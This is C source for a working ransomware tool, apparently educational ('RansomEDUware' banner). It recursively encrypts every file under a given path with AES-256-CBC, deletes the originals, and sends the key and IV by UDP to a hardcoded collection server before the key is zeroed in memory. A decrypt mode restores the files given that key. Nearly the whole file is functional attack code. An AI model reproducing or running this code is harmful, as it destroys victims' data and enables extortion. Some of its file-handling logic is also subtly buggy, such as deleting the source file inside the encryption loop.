#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define IP "127.0.0.1"
#define PORT 8888
#define KEY_SIZE 32
#define IV_SIZE 16

void ascii_menu(){
    puts("  __________                                    ___________________   ____ ___                                \n"
         "  \\______   \\_____    ____   __________   _____ \\_   _____/\\______ \\ |    |   \\__  _  _______ _______   ____  \n"
         "   |       _/\\__  \\  /    \\ /  ___/  _ \\ /     \\ |    __)_  |    |  \\|    |   /\\ \\/ \\/ /\\__  \\\\_  __ \\_/ __ \\ \n"
         "   |    |   \\ / __ \\|   |  \\\\___ (  <_> )  Y Y  \\|        \\ |    `   \\    |  /  \\     /  / __ \\|  | \\/\\  ___/ \n"
         "   |____|_  /(____  /___|  /____  >____/|__|_|  /_______  //_______  /______/    \\/\\_/  (____  /__|    \\___  >\n"
         "          \\/      \\/     \\/     \\/            \\/        \\/         \\/                        \\/            \\/ \n"
         "");
    puts("                ------------------------- Way to use ------------------------------\n"
         "                ------------------- To encrypt : -crypt <PATH> --------------------\n"
         "                -------------- To decrypt : -decrypt <PATH> <KEY> <IV> ------------\n");

}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

int
encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    if (!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv,
            unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    if (!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    if (1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    if (1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}

char *byteTOhex(const unsigned char *bytes, const unsigned short int size) {
    char *buffer_str = (char *) malloc(((size * 2) + 1) * sizeof(char));

    if (buffer_str == NULL) return NULL;

    for (unsigned int i = 0; i < size; i++) {
        sprintf(&buffer_str[i * 2], "%02X", bytes[i]);
    }

    return buffer_str;
}

unsigned char *hexTObytes(const char *msg_hexa) {
    unsigned long int size = (strlen(msg_hexa) / 2);
    unsigned char *msg_byte = (unsigned char *) malloc(size * sizeof(unsigned char));

    if (msg_byte == NULL)
        return NULL;

    for (unsigned short int i = 0, j = 0; i < size; i++, j += 2)
        msg_byte[i] = (msg_hexa[j] % 32 + 9) % 25 * 16 + (msg_hexa[j + 1] % 32 + 9) % 25;

    return msg_byte;
}

void socket_msg(unsigned char key[32], unsigned char iv[16]) {
    char *server_ip = IP;
    int server_port = PORT;

    int sockid = socket(AF_INET, SOCK_DGRAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    char *msg_key, *msg_iv, *return_line = "\n";

    msg_key = byteTOhex(key, 32);
    msg_iv = byteTOhex(iv, 16);

    sendto(sockid, (const char *) msg_key, strlen(msg_key), 0, (const struct sockaddr *) &server_addr,
           sizeof(server_addr));
    sendto(sockid, (const char *) return_line, strlen(return_line), 0, (const struct sockaddr *) &server_addr,
           sizeof(server_addr));
    sendto(sockid, (const char *) msg_iv, strlen(msg_iv), 0, (const struct sockaddr *) &server_addr,
           sizeof(server_addr));

    close(sockid);

    free(msg_key);
    free(msg_iv);
}

long int findSize(char file_name[]){

    FILE* file_stream = fopen(file_name, "r");

    if (file_stream == NULL) {
        printf("File not found !\n");
        return -1;
    }

    fseek(file_stream, 0L, SEEK_END);

    long int res = ftell(file_stream);

    fclose(file_stream);

    return res;
}

void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
    DIR *directory;
    struct dirent *entry;
    FILE *file_start, *file_crypted;
    directory = opendir(path);

    while ((entry = readdir(directory)) != NULL) {

        char *file = entry->d_name;

        if (entry->d_type == DT_DIR && strcmp(file, ".") != 0 &&
            strcmp(file, "..") != 0) {

            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;

            char *buffer_directory = (char *) malloc(lenght * sizeof(char));

            if (buffer_directory != NULL) {
                snprintf(buffer_directory, lenght, "%s/%s", path, file);

                crypted_list_dir(buffer_directory, key, iv);

                free(buffer_directory);
            }
        } else if ((strcmp(file, ".")) != 0 && (strcmp(file, "..") != 0) && (strstr(file, ".crypted") == 0)) {


            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;

            char *buffer_start = (char *) malloc(lenght * sizeof(char));
            char *buffer_crypted = (char *) malloc(
                    (lenght + 8) * sizeof(char));

            if (buffer_start == NULL) {
                printf("Can't allocate the memory !\n");
            } else if (buffer_start != NULL) {
                snprintf(buffer_start, lenght, "%s/%s", path, file);

                if (buffer_start == NULL) {
                    printf("No filepath\n");
                }

                long int res = findSize(buffer_start);

                if (res > 100000000 || res <= 0){
                    printf("Skipping '%s' - size : %ld bytes\n",file, res);
                    free(buffer_start);
                    free(buffer_crypted);
                    continue;
                    }

                file_start = fopen(buffer_start, "r");

                snprintf(buffer_crypted, lenght + 10, "%s/%s.crypted", path,
                         file);

                file_crypted = fopen(buffer_crypted, "w+");

                if (file_start == NULL) {
                    printf("Can't open file : %s\n", buffer_start);
                } else {

                    unsigned char text_in_file[1024];
                    unsigned char crypted_text_in_file[1040];

                    int read_file_len_start;

                    while ((read_file_len_start = fread(text_in_file, sizeof(unsigned char), 1024, file_start)) !=
                           0) {

                        int file_crypted_len = encrypt(text_in_file, read_file_len_start, key, iv,
                                                       crypted_text_in_file);
                        fwrite(crypted_text_in_file, sizeof(unsigned char), file_crypted_len, file_crypted);
                        remove(buffer_start);
                    }
                }

                fclose(file_start);
                fclose(file_crypted);
            }

            free(buffer_start);
            free(buffer_crypted);
        }
    }

    closedir(directory);

    printf("--------------------------------------------------------\n");
    printf("Directory : %s......done!\n", path);

}

void decrypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
    DIR *directory;
    struct dirent *entry;
    FILE *file_crypted, *file_decrypted;
    directory = opendir(path);

    while ((entry = readdir(directory)) != NULL) {

        char *file = entry->d_name;

        if (entry->d_type == DT_DIR && strcmp(file, ".") != 0 && strcmp(file, "..") != 0 &&
            strstr(file, ".crypted") == NULL) {

            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;

            char *buffer_directory = (char *) malloc(lenght * sizeof(char));

            if (buffer_directory != NULL) {
                snprintf(buffer_directory, lenght, "%s/%s", path, file);

                decrypted_list_dir(buffer_directory, (unsigned char *) key, (unsigned char *) iv);

                free(buffer_directory);
            }
        } else if ((strcmp(file, ".") != 0) && (strcmp(file, "..") != 0) && (strstr(file, ".crypted") != NULL)) {
            unsigned short int lenght = strlen(path) + 1 + strlen(file) + 1;

            char *buffer_crypted = (char *) malloc(
                    (lenght) * sizeof(char));

            if (buffer_crypted == NULL) {
                printf("Can't allocate the memory !\n");
            } else if (buffer_crypted != NULL) {
                snprintf(buffer_crypted, lenght, "%s/%s", path, file);

                if (buffer_crypted == NULL) {
                    printf("No filepath\n");
                }

                file_crypted = fopen(buffer_crypted, "r");

                unsigned long int new_file_lenght = (lenght - 8) * (sizeof(char));

                char file_new[new_file_lenght];

                memcpy(file_new, buffer_crypted, new_file_lenght - 1);

                file_new[new_file_lenght - 1] = '\0';

                file_decrypted = fopen(file_new, "w+");

                if (file_crypted == NULL) {
                    printf("Can't open file : %s\n", buffer_crypted);
                } else {

                    unsigned char crypted_text_in_file[1040];
                    unsigned char decrypted_text_in_file[1024];

                    int read_file_len_crypted;

                    while ((read_file_len_crypted = fread(crypted_text_in_file, sizeof(unsigned char), 1040,
                                                          file_crypted)) != 0) {

                        int file_decrypted_len = decrypt(crypted_text_in_file, read_file_len_crypted, key, iv,
                                                         decrypted_text_in_file);
                        fwrite(decrypted_text_in_file, sizeof(unsigned char), file_decrypted_len, file_decrypted);
                        remove(buffer_crypted);
                    }

                }

                fclose(file_crypted);
                fclose(file_decrypted);

            }
            free(buffer_crypted);
        }
    }

    closedir(directory);

    printf("--------------------------------------------------------\n");
    printf("Directory : %s......done!\n", path);
}

int main(int argc, char *argv[]) {
    clock_t t;
    t = clock();

    if (argc == 1) {
        ascii_menu();
        exit(0);
    }

    if (strcmp(argv[1], "-decrypt") == 0) {

        if (strlen(argv[2]) <= PATH_MAX != 0) {
            unsigned char *key_bytes, *iv_bytes;
            char *key_hex, *iv_hex;

            key_bytes = hexTObytes(argv[3]);
            iv_bytes = hexTObytes(argv[4]);

            key_hex = byteTOhex(key_bytes, KEY_SIZE);
            iv_hex = byteTOhex(iv_bytes, IV_SIZE);

            printf("Key : %s\nIV : %s\n", key_hex, iv_hex);

            printf("------- Decrypting -------\n");

            decrypted_list_dir(argv[2], key_bytes, iv_bytes);

            free(key_bytes);
            free(iv_bytes);
            free(key_hex);
            free(iv_hex);

            printf("------- Decrypting done ! -------\n");
        }
    } else if (strcmp(argv[1], "-crypt") == 0) {
        unsigned char *key_bytes = (unsigned char *) malloc(KEY_SIZE);
        unsigned char *iv_bytes = (unsigned char *) malloc(IV_SIZE);

        char *key_hex, *iv_hex;

        RAND_bytes(key_bytes, KEY_SIZE);
        RAND_bytes(iv_bytes, IV_SIZE);

        key_hex = byteTOhex(key_bytes, KEY_SIZE);
        iv_hex = byteTOhex(iv_bytes, IV_SIZE);

        socket_msg(key_bytes, iv_bytes);

        printf("------- Crypting ! -------\n");

        if (strlen(argv[2]) <= PATH_MAX != 0) {
            crypted_list_dir(argv[2], key_bytes, iv_bytes);
        }
        memset(key_bytes, 0, KEY_SIZE);
        memset(iv_bytes, 0, IV_SIZE);

        printf("------- Crypting done ! -------\n");

        printf("Key : %s \nIV : %s\n", key_hex, iv_hex);

        free(key_bytes);
        free(iv_bytes);
        free(key_hex);
        free(iv_hex);
    }

    t = clock() - t;
    double time_taken = ((double)t)/CLOCKS_PER_SEC;
    printf("Time taken : %f seconds\n", time_taken);

    return (0);
}